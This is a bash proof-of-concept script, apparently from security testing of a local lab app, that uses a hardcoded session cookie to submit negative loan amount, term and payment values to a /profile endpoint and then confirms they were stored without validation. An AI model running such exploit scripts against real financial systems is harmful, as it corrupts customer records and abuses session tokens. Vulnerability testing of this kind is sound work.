#!/bin/bash

# POC: Negative Value Injection in Loan Parameters
# Target: /profile endpoint
# Description: Demonstrates acceptance and persistence of negative loan parameter values

set -e

TARGET_URL="${1:-http://localhost:32768}"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4l1Q.HCUPd0DtxvLhBOb42cVB4EE0uKQ"

echo "[*] Testing Negative Value Injection in Loan Parameters"
echo "[*] Target: ${TARGET_URL}/profile"
echo "[*] Session: ${SESSION_COOKIE}"
echo ""

# Step 1: Submit negative values via POST
echo "[+] Step 1: Submitting negative loan parameters to /profile"
echo "    - loan_amount: -5000"
echo "    - loan_term_months: -12"
echo "    - monthly_payment: -100"
echo ""

POST_RESPONSE=$(curl -s -b "${SESSION_COOKIE}" -X POST "${TARGET_URL}/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=-5000&loan_term_months=-12&monthly_payment=-100" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -n 1)
BODY=$(echo "$POST_RESPONSE" | head -n -1)

echo "[*] POST Response Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "200" ]]; then
    echo "[+] Request accepted (HTTP $HTTP_CODE)"
else
    echo "[-] Request rejected (HTTP $HTTP_CODE)"
    exit 1
fi
echo ""

# Step 2: Retrieve profile and verify negative values were persisted
echo "[+] Step 2: Retrieving profile to verify persistence of negative values"
echo ""

GET_RESPONSE=$(curl -s -b "${SESSION_COOKIE}" "${TARGET_URL}/profile")

echo "[*] Profile Response (relevant fields):"
echo "$GET_RESPONSE" | grep -E "(loan_amount|loan_term_months|monthly_payment)" || echo "[!] Could not find fields in HTML"
echo ""

# Step 3: Verify negative values are present
echo "[+] Step 3: Verifying negative values were persisted"
echo ""

if echo "$GET_RESPONSE" | grep -q "\-5000"; then
    echo "[✓] VULNERABILITY CONFIRMED: loan_amount=-5000 persisted in database"
else
    echo "[!] Could not verify loan_amount in response"
fi

if echo "$GET_RESPONSE" | grep -q "\-12" || echo "$GET_RESPONSE" | grep -q "value=\"-12\""; then
    echo "[✓] VULNERABILITY CONFIRMED: loan_term_months=-12 persisted in database"
else
    echo "[!] Could not verify loan_term_months in response"
fi

if echo "$GET_RESPONSE" | grep -q "\-100"; then
    echo "[✓] VULNERABILITY CONFIRMED: monthly_payment=-100 persisted in database"
else
    echo "[!] Could not verify monthly_payment in response"
fi

echo ""
echo "[+] POC Complete: Negative values were accepted and stored without validation"
echo "[!] Business Logic Impact: Negative loan values create financial corruption"
echo "    - Negative principal inverts liability (credit instead of debt)"
echo "    - Negative payment terms are nonsensical (backwards time)"
echo "    - Negative payments represent credit instead of obligation"